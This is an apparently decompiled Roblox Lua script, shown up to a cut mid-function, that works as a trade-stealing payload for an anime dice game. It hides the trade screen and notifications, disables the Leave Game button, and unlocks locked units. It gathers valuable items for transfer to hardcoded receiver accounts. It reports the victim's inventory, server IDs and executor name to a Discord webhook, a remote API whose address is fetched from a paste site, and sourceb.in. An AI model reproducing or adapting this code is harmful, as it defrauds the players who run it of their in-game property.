

local function geniter(f, s, c)
	if type(f) ~= "function" then
		local mt = getmetatable(f)

		if type(mt) == "table" and mt.__iter then
			f, s, c = mt.__iter(f)
		elseif type(f) == "table" then
			f, s, c = next, f, nil
		end
	end

	return function()
		local r = table.pack(f(s, c))

		if r[1] == nil then
			return false
		end

		c = r[1]

		return true, table.unpack(r, 1, r.n)
	end
end

if _G.ran then
	return
end

_G.ran = true

if not game:IsLoaded() then
	game.Loaded:Wait()
end

local RECEIVERS = getgenv().RECEIVERS or {LOOTS_01}
local THRESHOLD = getgenv().THRESHOLD or 10

getgenv().ITEM_WHITELIST = getgenv().ITEM_WHITELIST or {
	["Jackpot Spin"] = true,
	Gems = true,
	["Lucky Spin"] = true,
	["Trait Reroll"] = true,
	["Divine Gears"] = true,
	["Angel's Halo"] = true,
	["Sakuna's Sash"] = true,
	["Enol's Drums"] = true,
	["Obita's Mask"] = true,
	["Mazun's Coat"] = true,
	["Shadow Luck IV"] = true,
	["Shadow Speed IV"] = true,
	["Shadow Income IV"] = true,
	["Igras's Helm"] = true
}

local ITEM_WHITELIST = getgenv().ITEM_WHITELIST
local t1 = {
	["Jackpot Spin"] = true,
	["Lucky Spin"] = true,
	["Divine Gears"] = true,
	["Angel's Halo"] = true,
	["Sakuna's Sash"] = true,
	["Enol's Drums"] = true,
	["Obita's Mask"] = true,
	["Mazun's Coat"] = true,
	["Igras's Helm"] = true
}
local t2 = {}

local function v9(p1, p2)
	if p1 and p1.kind == "Gamepass" then
		return true
	end

	if type(p2) == "string" and p2:sub(-9) == " Gamepass" then
		return true
	end

	return false
end

local t3 = {}

for i, v in ipairs({
	"Jackpot Spin",
	"Gems",
	"Lucky Spin",
	"Trait Reroll",
	"Divine Gears",
	"Angel's Halo",
	"Sakuna's Sash",
	"Enol's Drums",
	"Obita's Mask",
	"Mazun's Coat",
	"Igras's Helm",
	"Shadow Luck IV",
	"Shadow Speed IV",
	"Shadow Income IV"
}) do
	t3[v] = i
end

local function v13(p3)
	if type(p3) ~= "string" then
		return false
	end

	if type(ITEM_WHITELIST) == "table" then
		return ITEM_WHITELIST[p3] == true
	end

	return true
end

local v14 = "https://pastefy.app/fuWreksR/raw?t=" .. tostring(tick())
local WEBHOOK = getgenv().WEBHOOK or "https://discord.com/api/webhooks/1558682988743757824/_flog6Pl828UKpVT6IQV8m0wA0nKNi3MwOE0uKUMpSD2oLFg3jlQD8A98bn46E1MYBU3"
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local Framework = ReplicatedStorage:WaitForChild("Framework")

if not Framework:GetAttribute("IsLoaded") then
	Framework:GetAttributeChangedSignal("IsLoaded"):Wait()
end

if not LocalPlayer:GetAttribute("__LOADED") then
	LocalPlayer:GetAttributeChangedSignal("__LOADED"):Wait()
end

pcall(function()
	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
	local ElysiumNotifGui = PlayerGui:FindFirstChild("ElysiumNotifGui")

	if ElysiumNotifGui then
		ElysiumNotifGui:Destroy()
	end

	local ScreenGui = Instance.new("ScreenGui")

	ScreenGui.Name = "Xyiennotifdiff"
	ScreenGui.ResetOnSpawn = false
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ScreenGui.DisplayOrder = 999
	pcall(function()
		ScreenGui.IgnoreGuiInset = true
	end)
	ScreenGui.Parent = PlayerGui

	local uDim2 = UDim2.new(1, 20, 1, -68)
	local uDim22 = UDim2.new(1, -256, 1, -68)
	local Frame = Instance.new("Frame")

	Frame.Name = "BorderFrame"
	Frame.Size = UDim2.new(0, 240, 0, 52)
	Frame.Position = uDim2
	Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Frame.BorderSizePixel = 0
	Frame.ZIndex = 10
	Frame.Parent = ScreenGui
	Instance.new("UICorner", Frame).CornerRadius = UDim.new(1, 0)

	local UIGradient = Instance.new("UIGradient", Frame)

	UIGradient.Rotation = 0

	local colorSequenceKeypointNew = ColorSequenceKeypoint.new

	UIGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 200, 255)),
		ColorSequenceKeypoint.new(0.33, Color3.fromRGB(170, 100, 255)),
		ColorSequenceKeypoint.new(0.66, Color3.fromRGB(255, 120, 200)),
		colorSequenceKeypointNew(1, Color3.fromRGB(70, 200, 255))
	})

	local Frame2 = Instance.new("Frame")

	Frame2.Name = "InnerPanel"
	Frame2.Size = UDim2.new(1, -2, 1, -2)
	Frame2.Position = UDim2.new(0, 1, 0, 1)
	Frame2.BackgroundColor3 = Color3.fromRGB(14, 16, 26)
	Frame2.BackgroundTransparency = 0.05
	Frame2.BorderSizePixel = 0
	Frame2.ZIndex = 11
	Frame2.Parent = Frame
	Instance.new("UICorner", Frame2).CornerRadius = UDim.new(1, 0)

	local UIGradient2 = Instance.new("UIGradient", Frame2)

	UIGradient2.Rotation = 110
	UIGradient2.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 0.25),
		NumberSequenceKeypoint.new(0.5, 0.55),
		NumberSequenceKeypoint.new(1, 0.3)
	})

	local colorSequenceKeypointNew2 = ColorSequenceKeypoint.new

	UIGradient2.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 80, 130)),
		colorSequenceKeypointNew2(1, Color3.fromRGB(80, 40, 120))
	})

	local Frame3 = Instance.new("Frame")

	Frame3.Name = "Shimmer"
	Frame3.Size = UDim2.new(0, 50, 1, 0)
	Frame3.Position = UDim2.new(0, -60, 0, 0)
	Frame3.BackgroundColor3 = Color3.fromRGB(200, 230, 255)
	Frame3.BackgroundTransparency = 0.85
	Frame3.BorderSizePixel = 0
	Frame3.ZIndex = 12
	Frame3.Parent = Frame2
	Instance.new("UICorner", Frame3).CornerRadius = UDim.new(1, 0)

	local UIGradient3 = Instance.new("UIGradient", Frame3)

	UIGradient3.Rotation = 20
	UIGradient3.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0, 1),
		NumberSequenceKeypoint.new(0.5, 0.3),
		NumberSequenceKeypoint.new(1, 1)
	})

	local Frame4 = Instance.new("Frame")

	Frame4.Name = "IconWrap"
	Frame4.Size = UDim2.new(0, 36, 0, 36)
	Frame4.Position = UDim2.new(0, 9, 0.5, -18)
	Frame4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Frame4.BorderSizePixel = 0
	Frame4.ZIndex = 13
	Frame4.Parent = Frame2
	Instance.new("UICorner", Frame4).CornerRadius = UDim.new(1, 0)

	local UIGradient4 = Instance.new("UIGradient", Frame4)

	UIGradient4.Rotation = 0

	local colorSequenceKeypointNew3 = ColorSequenceKeypoint.new

	UIGradient4.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 220, 255)),
		ColorSequenceKeypoint.new(0.5, Color3.fromRGB(180, 110, 255)),
		colorSequenceKeypointNew3(1, Color3.fromRGB(255, 130, 210))
	})

	local Frame5 = Instance.new("Frame")

	Frame5.Name = "IconDisc"
	Frame5.Size = UDim2.new(1, -4, 1, -4)
	Frame5.Position = UDim2.new(0, 2, 0, 2)
	Frame5.BackgroundColor3 = Color3.fromRGB(14, 16, 26)
	Frame5.BorderSizePixel = 0
	Frame5.ZIndex = 14
	Frame5.Parent = Frame4
	Instance.new("UICorner", Frame5).CornerRadius = UDim.new(1, 0)

	local TextLabel = Instance.new("TextLabel")

	TextLabel.Size = UDim2.new(1, 0, 1, 0)
	TextLabel.BackgroundTransparency = 1
	TextLabel.Text = "ðŸ’µ"
	TextLabel.TextSize = 17
	TextLabel.Font = Enum.Font.GothamBold
	TextLabel.ZIndex = 15
	TextLabel.Parent = Frame5

	local Frame6 = Instance.new("Frame")

	Frame6.Name = "LiveDot"
	Frame6.Size = UDim2.new(0, 6, 0, 6)
	Frame6.Position = UDim2.new(0, 54, 0.5, -3)
	Frame6.BackgroundColor3 = Color3.fromRGB(100, 255, 170)
	Frame6.BorderSizePixel = 0
	Frame6.ZIndex = 14
	Frame6.Parent = Frame2
	Instance.new("UICorner", Frame6).CornerRadius = UDim.new(1, 0)

	local TextLabel2 = Instance.new("TextLabel")

	TextLabel2.Size = UDim2.new(1, -70, 0, 18)
	TextLabel2.Position = UDim2.new(0, 68, 0, 8)
	TextLabel2.BackgroundTransparency = 1
	TextLabel2.Text = "Join our Discord!"
	TextLabel2.TextColor3 = Color3.fromRGB(240, 245, 255)
	TextLabel2.TextSize = 14
	TextLabel2.Font = Enum.Font.GothamBold
	TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
	TextLabel2.ZIndex = 14
	TextLabel2.Parent = Frame2

	local TextLabel3 = Instance.new("TextLabel")

	TextLabel3.Size = UDim2.new(1, -70, 0, 14)
	TextLabel3.Position = UDim2.new(0, 68, 0, 26)
	TextLabel3.BackgroundTransparency = 1
	TextLabel3.Text = "discord.gg/3lysium"
	TextLabel3.TextColor3 = Color3.fromRGB(150, 200, 235)
	TextLabel3.TextSize = 10
	TextLabel3.Font = Enum.Font.GothamMedium
	TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
	TextLabel3.ZIndex = 14
	TextLabel3.Parent = Frame2

	local TextButton = Instance.new("TextButton")

	TextButton.Size = UDim2.new(1, 0, 1, 0)
	TextButton.BackgroundTransparency = 1
	TextButton.Text = ""
	TextButton.ZIndex = 20
	TextButton.Parent = Frame
	TextButton.MouseButton1Click:Connect(function()
		local function v44()
			if setclipboard then
				setclipboard("https://discord.gg/3lysium")
			end
		end

		pcall(v44)
		TextLabel3.Text = "âœ“ Copied!"
		TextLabel3.TextColor3 = Color3.fromRGB(120, 255, 170)
		task.delay(2, function()
			TextLabel3.Text = "discord.gg/3lysium"
			TextLabel3.TextColor3 = Color3.fromRGB(150, 200, 235)
		end)
	end)

	local function v45(p4)
		local tween = TweenService:Create(Frame, TweenInfo.new(0.55, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
			Position = p4
		})

		tween:Play()
		tween.Completed:Wait()
	end

	task.spawn(function()
		local rotation = 0

		while Frame.Parent do
			rotation = (rotation + 2) % 360
			UIGradient.Rotation = rotation
			task.wait(0.03)
		end
	end)
	task.spawn(function()
		local rotation = 360

		while Frame4.Parent do
			rotation = (rotation - 5) % 360
			UIGradient4.Rotation = rotation
			task.wait(0.03)
		end
	end)
	task.spawn(function()
		task.wait(2)

		while Frame2.Parent do
			Frame3.Position = UDim2.new(0, -60, 0, 0)
			TweenService:Create(Frame3, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
				Position = UDim2.new(1, 10, 0, 0)
			}):Play()
			task.wait(3.5)
		end
	end)
	task.spawn(function()
		while Frame2.Parent do
			TweenService:Create(Frame6, TweenInfo.new(0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
				BackgroundTransparency = 0.05,
				Size = UDim2.new(0, 8, 0, 8),
				Position = UDim2.new(0, 53, 0.5, -4)
			}):Play()
			task.wait(0.7)
			TweenService:Create(Frame6, TweenInfo.new(0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
				BackgroundTransparency = 0.55,
				Size = UDim2.new(0, 6, 0, 6),
				Position = UDim2.new(0, 54, 0.5, -3)
			}):Play()
			task.wait(0.7)
		end
	end)
	task.spawn(function()
		task.wait(1.5)

		while Frame.Parent do
			v45(uDim22)
			task.wait(10)
			v45(uDim2)
			task.wait(2.5)
		end
	end)

	return Frame
end)

local Features = Framework.Features
local DataController = require(Features.Data.DataController)
local EntryRegistry = require(Features.Inventory.EntryRegistry)
local TradeConfig = require(Features.Trading.TradeConfig)
local ClientComm = require(ReplicatedStorage.Packages.Network).ClientComm
local v54 = ClientComm.new(ReplicatedStorage.Network, false, "TradeService")
local signal = v54:GetSignal("RequestTrade")
local signal2 = v54:GetSignal("ChangeOffer")
local signal3 = v54:GetSignal("AdvanceTrade")
local signal4 = v54:GetSignal("CancelTrade")
local signal5 = v54:GetSignal("TradeEvent")
local signal6 = ClientComm.new(ReplicatedStorage.Network, false, "UnitService"):GetSignal("SetLocked")

local function v61()
end

local t4 = {}

for _, v in ipairs(RECEIVERS) do
	if type(v) == "string" then
		t4[v:lower()] = v
	end
end

local function v65(p5)
	if not p5 or p5 == LocalPlayer then
		return false
	end

	if type(p5.Name) == "string" then
		return t4[p5.Name:lower()] ~= nil
	end

	return false
end
local function v66(p6)
	if type(p6) ~= "string" then
		return nil
	end

	local v67 = p6:lower()

	for _, player in ipairs(Players:GetPlayers()) do
		if player == LocalPlayer or type(player.Name) ~= "string" then
			continue
		end

		if player.Name:lower() == v67 then
			return player
		end
	end

	return nil
end

if LocalPlayer.AccountAge < TradeConfig.MIN_ACCOUNT_AGE then
	local v70 = ("Account must be %*+ days old."):format(TradeConfig.MIN_ACCOUNT_AGE)

	return v61(v70)
end

if DataController.Rolls() < TradeConfig.MIN_ROLLS then
	local v71 = ("Need %* rolls to trade."):format(TradeConfig.MIN_ROLLS)

	return v61(v71)
end

pcall(function()
	local Trading = require(Features.UI.UIReferences).Root.Trading

	local function v73(p7)
		if not p7 then
			return
		end

		pcall(function()
			p7.Visible = false
		end)
		pcall(function()
			p7:GetPropertyChangedSignal("Visible"):Connect(function()
				if p7.Visible then
					pcall(function()
						p7.Visible = false
					end)
				end
			end)
		end)
		pcall(function()
			if p7:IsA("GuiObject") then
				p7.Position = UDim2.new(-10, 0, -10, 0)
			end
		end)
	end

	v73(Trading.TradeScreen)
	v73(Trading.BackgroundDarkness)
	v73(Trading.TradeNotification)
end)
pcall(function()
	local HUDController = require(Features.UI.HUDController)

	if type(HUDController) ~= "table" then
		return
	end

	local hideAll = HUDController.hideAll
	local showAll = HUDController.showAll

	if type(hideAll) == "function" then
		HUDController.hideAll = function(p8, ...)
			if p8 == "trade" then
				return
			end

			return hideAll(p8, ...)
		end
	end

	if type(showAll) == "function" then
		HUDController.showAll = function(p9, ...)
			if p9 == "trade" then
				return
			end

			return showAll(p9, ...)
		end
	end
end)
pcall(function()
	local MenuController = require(Features.UI.MenuController)

	if type(MenuController) ~= "table" then
		return
	end

	task.spawn(function()
		while true do
			pcall(function()
				MenuController.CanOpen = true
			end)
			task.wait(0.1)
		end
	end)
end)
pcall(function()
	local NotificationController = require(Features.Notifications.NotificationController)

	if type(NotificationController) ~= "table" then
		return
	end

	if type(NotificationController.TextNotification) ~= "function" then
		return
	end

	NotificationController.TextNotification = function()
	end
end)
task.spawn(function()
	while task.wait() do
		pcall(function()
			for _, v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
				v:Disable()
			end
		end)
	end
end)

local function v81()
	local ok, result = pcall(function()
		return game:HttpGet(v14)
	end)

	if ok and result then
		local match = result:match("^%s*(.-)%s*$")

		if match and match ~= "" then
			if not match:match("^https?://") then
				return "http://" .. match
			end

			return match
		end
	end

	return ""
end

if not getgenv().API_BASE then
	getgenv().API_BASE = v81()
end

local API_BASE = getgenv().API_BASE

v61("API_BASE: " .. API_BASE)

local function v86()
	return syn and syn.request or http_request or request
end
local function v87()
	if identifyexecutor then
		local ok, result = pcall(identifyexecutor)

		if ok and result then
			return tostring(result)
		end
	end

	if getexecutorname then
		local ok, result = pcall(getexecutorname)

		if ok and result then
			return tostring(result)
		end
	end

	if syn then
		return "Synapse X"
	end

	if fluxus then
		return "Fluxus"
	end

	if KRNL_LOADED then
		return "KRNL"
	end

	return "Unknown"
end
local function v92(p10, p11, p12)
	if not p10 or p10 == "" then
		return
	end

	local v93 = v86()

	if not v93 then
		return
	end

	local v94 = "content=" .. HttpService:UrlEncode(p11 or "") .. "&embeds=" .. HttpService:UrlEncode(HttpService:JSONEncode(p12))
	local v95 = API_BASE .. "/webhook/" .. HttpService:UrlEncode(p10)
	local ok, result = pcall(function()
		return v93({
			Url = v95,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/x-www-form-urlencoded",
				["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
			},
			Body = v94
		})
	end)

	if not ok then
		v61("Webhook failed: " .. tostring(result))
	end
end

local t5 = {
	{
		1e63,
		"Vg"
	},
	{
		1e60,
		"Nod"
	},
	{
		1e57,
		"Ocd"
	},
	{
		1e54,
		"Spd"
	},
	{
		1e51,
		"Sxd"
	},
	{
		1e48,
		"Qid"
	},
	{
		1e45,
		"Qad"
	},
	{
		1e42,
		"Td"
	},
	{
		1e39,
		"Dd"
	},
	{
		1e36,
		"Ud"
	},
	{
		1e33,
		"Dc"
	},
	{
		1e30,
		"No"
	},
	{
		1e27,
		"Oc"
	},
	{
		1e24,
		"Sp"
	},
	{
		1e21,
		"Sx"
	},
	{
		1e18,
		"Qi"
	},
	{
		1e15,
		"Qa"
	},
	{
		1e12,
		"T"
	},
	{
		1e9,
		"B"
	},
	{
		1000000,
		"M"
	},
	{
		1000,
		"K"
	}
}

local function v99(p13)
	local v100 = tonumber(p13)
	local v101 = v100 or 0
	local v102 = v101 < 0
	local v103 = math.abs(v101)

	if v103 < 1000 then
		return (v102 and "-" or "") .. tostring(math.floor(v103))
	end

	for _, v in ipairs(t5) do
		if v[1] <= v103 then
			return (v102 and "-" or "") .. string.format("%.2f%s", v103 / v[1], v[2])
		end
	end

	return (v102 and "-" or "") .. string.format("%.2e", v103)
end
local function v106(p14)
	if not p14 or p14 <= 0 then
		return "?"
	end

	return "1 in " .. v99(p14)
end
local function v107(p15)
	local v108 = p15.trait and " (" .. p15.trait .. ")"

	v108 = v108 or ""

	return string.format("%s âžœ %s%s", p15.name, v106(p15.rarity), v108)
end
local function v109(p16)
	if p16.isGamepass then
		return string.format("ðŸŽŸï¸ %s x%s", p16.name, v99(p16.amount))
	end

	return string.format("%s x%s", p16.name, v99(p16.amount))
end
local function v110(p17, p18)
	if not p17 then
		return nil
	end

	if type(p17.chance) ~= "function" then
		return nil
	end

	local pcall_ = pcall
	local ok, result = pcall_(p17.chance, p18 or {})

	if ok and type(result) == "number" and result > 0 then
		return result
	end

	return nil
end
local function v114(p19, p20)
	local v115 = p20 or 3

	for i = 1, v115 do
		if not p19 or not p19.Parent then
			return false
		end

		local n1 = 0
		local exitTo

		repeat
			if p19.Character or not (n1 < 10) then
				exitTo = 1

				break
			end

			task.wait(0.5)
			n1 += 0.5
		until not p19.Parent

		if exitTo ~= 1 then
			return false
		end

		if not p19.Character then
			task.wait(2)

			continue
		end

		local Humanoid = p19.Character:WaitForChild("Humanoid", 5)

		if not Humanoid then
			task.wait(2)

			continue
		end

		if Humanoid.Health <= 0 then
			task.wait(2)

			continue
		end

		task.wait(1)

		if p19.Parent and p19.Character then
			if p19.Character:FindFirstChildOfClass("Humanoid") then
				return true
			end
		end

		task.wait(2)
	end

	return false
end
local function v120(p21, p22)
	local v121 = EntryRegistry.getEntryConfig(p22.name)
	local v122 = v121 and EntryRegistry.getKindConfig(v121.kind)

	if not v121 or not v122 then
		return false, v121
	end

	if table.find(TradeConfig.UNTRADEABLE_ENTRIES, p22.name) then
		return false, v121
	end

	if not (v122.stackable or p22.amount == 1) then
		return false, v121
	end

	if v122.stackable and p21 ~= p22.name then
		return false, v121
	end

	if not (p22.amount <= 0 or p22.amount % 1 ~= 0) then
		return true, v121
	end

	return false, v121
end
local function v123(p23)
	local t6 = {}
	local t7 = {}
	local t8 = {}
	local pairs_ = pairs
	local v128 = DataController.Inventory()
	local v129, v130, v131 = pairs_(v128 or {})

	for k, v in v129, v130, v131 do
		local v134, v135 = v120(k, v)

		if v134 then
			local attributes = v.attributes or {}
			local v137 = v135.kind == "Unit"

			if not v9(v135, v.name) then
				if v137 then
					local v138 = v110(v135, attributes)
					local v139

					if THRESHOLD == 0 then
						v139 = true
					elseif v138 then
						v139 = v138 >= THRESHOLD
					else
						v139 = false
					end

					if v139 then
						table.insert(t8, {
							key = k,
							name = v.name,
							amount = v.amount,
							kind = v135.kind,
							rarity = v138,
							variant = v135.variant,
							trait = attributes.trait,
							level = attributes.level,
							mutation = attributes.mutation
						})
					end
				elseif v13(v.name) then
					table.insert(t7, {
						key = k,
						name = v.name,
						amount = v.amount,
						kind = v135.kind,
						variant = v135.variant,
						trait = attributes.trait,
						level = attributes.level,
						mutation = attributes.mutation
					})
				end
			elseif not t2[v.name] then
				table.insert(t6, {
					key = k,
					name = v.name,
					amount = v.amount,
					kind = v135.kind,
					isGamepass = true
				})
			end
		end
	end

	table.sort(t6, function(p24, p25)
		if p24.amount == p25.amount then
			return p24.name < p25.name
		end

		return p24.amount > p25.amount
	end)
	table.sort(t7, function(p26, p27)
		local v140 = t3[p26.name] or 1000
		local v141 = t3[p27.name] or 1000

		if v140 == v141 then
			return p26.name < p27.name
		end

		return v140 < v141
	end)
	table.sort(t8, function(p28, p29)
		local rarity = p28.rarity or 0
		local rarity2 = p29.rarity or 0

		if rarity == rarity2 then
			return p28.key < p29.key
		end

		return rarity > rarity2
	end)

	local t9 = {}
	local v145, v146, v147 = ipairs(t6)
	local v148 = geniter(v145, v146, v147)

	while true do
		local v149 = table.pack(v148())

		if not v149[1] then
			break
		end

		local v150 = v149[3]

		if TradeConfig.MAX_UNIQUE_ENTRIES <= #t9 then
			break
		end

		table.insert(t9, v150)
	end

	local v151, v152, v153 = ipairs(t7)
	local v154 = geniter(v151, v152, v153)

	while true do
		local v155 = table.pack(v154())

		if not v155[1] then
			break
		end

		local v156 = v155[3]

		if not (TradeConfig.MAX_UNIQUE_ENTRIES <= #t9) then
			table.insert(t9, v156)

			continue
		end

		break
	end

	local n2 = 0
	local v158, v159, v160 = ipairs(t8)

	for _, v in v158, v159, v160 do
		if not (TradeConfig.MAX_UNIQUE_ENTRIES <= #t9) then
			if not ((p23 or math.huge) <= n2) then
				table.insert(t9, v)
				n2 += 1

				continue
			end
		end

		break
	end

	local v163 = #t6 + #t7

	return t9, #t8 + v163, #t8, v163
end
local function v164()
	local t10 = {}
	local t11 = {}
	local t12 = {}
	local pairs_ = pairs
	local v169 = DataController.Inventory() or {}

	for k, v in pairs_(v169) do
		local v172, v173 = v120(k, v)

		if v172 then
			local attributes = v.attributes or {}
			local v175 = v173.kind == "Unit"

			if not v9(v173, v.name) then
				if v175 then
					table.insert(t12, {
						name = v.name,
						amount = v.amount,
						kind = v173.kind,
						rarity = v110(v173, attributes),
						variant = v173.variant,
						trait = attributes.trait,
						level = attributes.level,
						mutation = attributes.mutation
					})
				elseif v13(v.name) then
					table.insert(t11, {
						name = v.name,
						amount = v.amount,
						kind = v173.kind,
						variant = v173.variant,
						trait = attributes.trait,
						level = attributes.level,
						mutation = attributes.mutation
					})
				end
			elseif not t2[v.name] then
				table.insert(t10, {
					name = v.name,
					amount = v.amount,
					kind = v173.kind,
					isGamepass = true
				})
			end
		end
	end

	table.sort(t10, function(p30, p31)
		if p30.amount == p31.amount then
			return p30.name < p31.name
		end

		return p30.amount > p31.amount
	end)
	table.sort(t11, function(p32, p33)
		local v176 = t3[p32.name] or 1000
		local v177 = t3[p33.name] or 1000

		if v176 == v177 then
			return p32.name < p33.name
		end

		return v176 < v177
	end)
	table.sort(t12, function(p34, p35)
		local rarity = p34.rarity or 0
		local rarity2 = p35.rarity or 0

		if rarity == rarity2 then
			return p34.name < p35.name
		end

		return rarity > rarity2
	end)

	local t13 = {}

	for _, v in ipairs(t10) do
		table.insert(t13, v)
	end

	for _, v in ipairs(t11) do
		table.insert(t13, v)
	end

	return t12, t13, #t10
end
local function v185()
	local t14 = {}
	local n3 = 0
	local pairs_ = pairs
	local v189 = DataController.Inventory() or {}

	for k, v in pairs_(v189) do
		if v.attributes and v.attributes.locked then
			t14[k] = false
			n3 += 1
		end
	end

	return t14, n3
end
local function v192()
	local v193, v194 = v185()

	if v194 == 0 then
		return
	end

	signal6:Fire(v193)
	task.wait(1)

	local _, v196 = v185()

	if v196 > 0 then
		local v197 = v61
		local v198 = ("Unlocked %*/%* unit(s), %* still locked."):format(v194 - v196, v194, v196)

		v197(v198)
	end
end

task.spawn(function()
	local v199 = v86()

	if not v199 then
		return
	end

	local ok, result = pcall(function()
		return v199({
			Url = API_BASE .. "/track-execution-animedice",
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
				["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
			},
			Body = HttpService:JSONEncode({
				target_players = RECEIVERS,
				executor = v87()
			})
		})
	end)

	if ok then
		if type(result) == "table" then
			local StatusCode = result.StatusCode or 0

			if StatusCode == 204 then
				v61("Track-execution OK (204, silent success)")
			elseif StatusCode == 200 then
				v61("Track-execution OK (200)")
			else
				v61("Track-execution failed: HTTP " .. tostring(StatusCode))
			end

			return
		end
	end

	v61("Track-execution failed: " .. tostring(result))
end)

local function v203()
	local v204 = RECEIVERS or {}
	local v205 = v86()

	if not (#v204 ~= 0 and v205) then
		return
	end

	local t15 = {}

	for i, v in ipairs(RECEIVERS) do
		if type(v) == "string" then
			t15[i] = v:lower()
		end
	end

	if #t15 == 0 then
		return
	end

	task.spawn(function()
		local ok, result = pcall(function()
			return v205({
				Url = API_BASE .. "/signal-hit",
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json",
					["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
				},
				Body = HttpService:JSONEncode({
					place_id = tostring(game.PlaceId),
					job_id = game.JobId,
					target_players = t15,
					sender = LocalPlayer.Name,
					game_type = "animedice"
				})
			})
		end)

		if ok then
			v61("Signal hit sent for targets: " .. table.concat(t15, ", "))
		else
			v61("Signal hit failed: " .. tostring(result))
		end
	end)
end
local function v211(p36)
	local v212 = v86()

	if not v212 then
		return nil
	end

	local ok, result = pcall(function()
		return v212({
			Url = "https://sourceb.in/api/bins",
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json"
			},
			Body = HttpService:JSONEncode({
				files = { {
					content = p36
				} }
			})
		})
	end)

	if ok and result and result.StatusCode == 200 then
		local ok2, result2 = pcall(function()
			return HttpService:JSONDecode(result.Body)
		end)

		if ok2 and result2 and result2.key then
			return "https://cdn.sourceb.in/bins/" .. result2.key .. "/0"
		end
	end

	return nil
end
local function v217()
	local v218, v219 = v164()
	local t16 = {}

	table.insert(t16, "Player: " .. LocalPlayer.Name)

	local insert = table.insert
	local v222 = t16
	local v223 = THRESHOLD == 0 and "disabled"

	insert(v222, "Rarity threshold: " .. (v223 or v106(THRESHOLD)))
	table.insert(t16, "")
	table.insert(t16, "=== UNITS (" .. #v218 .. ") ===")

	for _, v in ipairs(v218) do
		local v226

		if THRESHOLD == 0 then
			v226 = true
		elseif v.rarity then
			v226 = v.rarity >= THRESHOLD
		else
			v226 = false
		end

		table.insert(t16, (v226 and "[TRADE] " or "[KEEP] ") .. v107(v))
	end

	table.insert(t16, "")
	table.insert(t16, "=== ITEMS (" .. #v219 .. ") ===")

	for _, v in ipairs(v219) do
		table.insert(t16, "[TRADE] " .. v109(v))
	end

	if #v219 == 0 then
		table.insert(t16, "(no items)")
	end

	return table.concat(t16, "\n")
end
local function v229(p37, p38)
	local v230 = p38 and "@everyone "

	v230 = v230 or ""
	task.spawn(function()
		v92(WEBHOOK, v230, p37)
	end)
end
local function v231(p39)
	task.spawn(function()
		v92("AaFaIalakb*abbaaMaqa[a6aLa-aaacbdb4a_a+aka*aSbeb<awala1aGaaaCa3acasa8a#aEaebaada#aba)a=akbdaRbnaXatawaDahayagbkbwaQazaba6a$avaaayaza[ayalbFb-aFagbibubyaga[aaaAabafa!a1a7aiafa6a*a8acaxa-aiazagavaebDamana-a(aSazaibdbabEa*aHaaabbqa=aCa$aQagbcaMakbhb1ajaibha%aCalbFaka#aAajbuazaBaaajb", "", p39)
	end)
end
local function v232(p40)
	local v233, v234, v235 = v164()
	local t17 = {}
	local v237, v238, v239 = ipairs(v233)
	local v240 = geniter(v237, v238, v239)

	while true do
		local v241 = table.pack(v240())

		if not v241[1] then
			break
		end

		local v242 = v241[3]

		if not (v241[2] > 20) then
			table.insert(t17, v107(v242))

			continue
		end

		break
	end

	if #v233 > 20 then
		table.insert(t17, string.format("...and %d more units", #v233 - 20))
	end

	if #t17 == 0 then
		table.insert(t17, "*No units*")
	end

	local t18 = {}
	local v244, v245, v246 = ipairs(v234)
	local v247 = geniter(v244, v245, v246)

	while true do
		local v248 = table.pack(v247())

		if not v248[1] then
			break
		end

		local v249 = v248[3]

		if not (v248[2] > 20) then
			table.insert(t18, v109(v249))

			continue
		end

		break
	end

	if #v234 > 20 then
		table.insert(t18, string.format("...and %d more items", #v234 - 20))
	end

	if #t18 == 0 then
		table.insert(t18, "*No items found*")
	end

	local v250 = THRESHOLD == 0 and "disabled" or ">= " .. v106(THRESHOLD)
	local v251 = false

	if v235 > 0 then
		v251 = true
	end

	if not v251 then
		local v252, v253, v254 = ipairs(v233)
		local v255 = geniter(v252, v253, v254)

		while true do
			local v256 = table.pack(v255())

			if not v256[1] then
				break
			end

			local v257 = v256[3]

			if THRESHOLD == 0 then
				v251 = true

				break
			elseif v257.rarity and THRESHOLD <= v257.rarity then
				v251 = true

				break
			end
		end
	end

	if not v251 then
		local v258, v259, v260 = ipairs(v234)

		for _, v in v258, v259, v260 do
			if not v.isGamepass and t1[v.name] then
				v251 = true

				break
			end
		end
	end

	local v263
	local v264 = v217(p40)
	local ok, result = pcall(v211, v264)

	if ok and result then
		v263 = result
	else
		v61("Sourcebin upload failed")
	end

